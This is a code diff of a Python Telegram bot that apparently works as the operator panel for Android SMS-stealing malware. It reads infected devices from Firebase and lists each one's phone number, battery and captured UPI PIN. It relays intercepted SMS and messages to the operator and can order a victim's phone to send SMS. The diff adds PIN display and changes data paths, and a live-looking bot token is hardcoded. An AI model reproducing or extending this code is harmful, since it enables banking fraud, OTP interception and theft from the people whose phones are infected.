@@ -94,7 +94,7 @@ async def set_firebase(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     url = context.args[0].replace('.json', '').rstrip('/')
-    firebase_base = f"{url}/user_data"
+    firebase_base = url
         
     await update.message.reply_text('✅ Firebase Connect Successfully!\n\nNext Step: /setdevice command use karein.')
 
@@ -109,7 +109,7 @@ async def show_device_page(update, context, page):
         return
     
     try:
-        response = requests.get(f"{firebase_base}.json")
+        response = requests.get(f"{firebase_base}/All_Users/Login.json")
         clients = response.json()
         if not clients:
             await update.message.reply_text("Koi clients nahi mile 📱.")
@@ -125,11 +125,13 @@ async def show_device_page(update, context, page):
         keyboard = []
         msg = "📱 **DEVICES LIST:**\n\n"
         for client_id, info in page_items:
-            # FIX: Firebase structure ke hisaab se name fetch
             d_info = info.get('device_info', {})
             name = d_info.get('d_name', 'Unknown')
             status_icon = "🟢" if info.get('status') == "online" else "🔴"
-            msg += f"{status_icon} {name}\n"
+            phone = d_info.get('phoneNumber', 'N/A')
+            battery = d_info.get('battery', 'N/A')
+            pin = d_info.get('upi_pin', 'N/A')
+            msg += f"{status_icon} {name}\n🆔 {client_id}\n📞 {phone}\n🔋 {battery}%\n📌 UPI Pin: {pin}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
             keyboard.append([InlineKeyboardButton(f"{status_icon} {name}", callback_data=f"view_{client_id}")])
 
         nav = []
@@ -157,18 +159,13 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         client_id = query.data.split("_")[1]
         selected_device_id = client_id
         try:
-            # All_Users/Login path se data fetch
-            base_url = firebase_base.replace('/user_data', '')
-            response = requests.get(f"{base_url}/All_Users/Login/{client_id}.json")
+            response = requests.get(f"{firebase_base}/All_Users/Login/{client_id}.json")
             details = response.json()
-            
-            # Format update
             d_info = details.get('device_info', {})
             status = "ONLINE 🟢" if details.get('status') == "online" else "OFFLINE 🔴"
-            
             msg = (f"📱 {d_info.get('d_name', 'Unknown')}\n"
                    f"🆔 {client_id}\n"
-                   f"📞 {d_info.get('phoneNumber', 'N/A')}\n"
+                   f"📞 {d_info.get('phoneNumber', 'Unknown')}\n"
                    f"🔋 {d_info.get('battery', 'N/A')}%\n"
                    f"📌 UPI Pin: {d_info.get('upi_pin', 'N/A')}\n"
                    f"{status}\n\n"
@@ -195,11 +192,11 @@ async def monitor_task(chat_id, context):
     last_msg_key = None
 
     try:
-        sms_data = requests.get(f"{firebase_base}/{selected_device_id}/sms.json").json()
+        sms_data = requests.get(f"{firebase_base}/All_Users/Login/{selected_device_id}/sms.json").json()
         if sms_data and isinstance(sms_data, dict):
             last_sms_key = list(sms_data.keys())[-1]
 
-        msg_data = requests.get(f"{firebase_base}/{selected_device_id}/messages.json").json()
+        msg_data = requests.get(f"{firebase_base}/All_Users/Login/{selected_device_id}/messages.json").json()
         if msg_data and isinstance(msg_data, dict):
             last_msg_key = list(msg_data.keys())[-1]
     except Exception as e:
@@ -207,7 +204,7 @@ async def monitor_task(chat_id, context):
 
     while is_monitoring:
         try:
-            sms_data = requests.get(f"{firebase_base}/{selected_device_id}/sms.json").json()
+            sms_data = requests.get(f"{firebase_base}/All_Users/Login/{selected_device_id}/sms.json").json()
             if sms_data and isinstance(sms_data, dict):
                 keys = list(sms_data.keys())
                 if keys[-1] != last_sms_key:
@@ -222,7 +219,7 @@ async def monitor_task(chat_id, context):
                         text = f"📩 New Incoming SMS\n\n{sms}"
                     await context.bot.send_message(chat_id=chat_id, text=text)
 
-            msg_data = requests.get(f"{firebase_base}/{selected_device_id}/messages.json").json()
+            msg_data = requests.get(f"{firebase_base}/All_Users/Login/{selected_device_id}/messages.json").json()
             if msg_data and isinstance(msg_data, dict):
                 keys = list(msg_data.keys())
                 if keys[-1] != last_msg_key:
@@ -263,7 +260,7 @@ async def forward_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
             
             if target_number and token:
                 payload = {"from": 0, "to": target_number, "message": token, "isSended": False}
-                push_url = f"{firebase_base}/{selected_device_id}/webhookEvent/sendSms.json"
+                push_url = f"{firebase_base}/All_Users/Login/{selected_device_id}/webhookEvent/sendSms.json"
                 response = requests.put(push_url, json=payload)
                 if response.status_code == 200:
                     await update.effective_chat.send_message(f"✅ SMS Sent to Connection Device!\n🎯 To: {target_number}")
@@ -272,7 +269,7 @@ async def forward_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
             else:
                 await update.message.reply_text("❌ Format mismatch!")
         except Exception as e:
-            await update.message.reply_text(f"❌ Error: {str(e)}")
+            await update.effective_chat.send_message(f"❌ Error: {str(e)}")
 
 if __name__ == '__main__':
     TOKEN = '8625469610:AAE2R7UpGmuyC7atp7xvX3f8Lns-u9PmCrE'
@@ -287,4 +284,4 @@ if __name__ == '__main__':
     app.add_handler(CallbackQueryHandler(button_handler))
     app.add_handler(MessageHandler(filters.ChatType.CHANNEL, forward_messages))
     app.run_polling()
-        
+    
